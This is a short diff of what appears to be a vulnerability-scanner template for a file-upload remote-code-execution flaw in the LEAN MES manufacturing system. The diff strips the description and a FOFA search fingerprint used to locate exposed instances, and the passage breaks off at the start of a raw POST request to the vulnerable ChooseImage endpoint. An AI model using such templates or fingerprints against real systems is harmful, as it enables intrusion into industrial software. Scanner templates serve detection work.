@@ -3,12 +3,8 @@ info:
   name: 深科特LEAN MES系统ChooseImage存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sdzxcxt10bhwikit'
+  description: ''
   tags: rce,file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sdzxcxt10bhwikit
-    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
 http:
 - raw:
   - 'POST /Kanban/ChooseImage.aspx HTTP/1.1
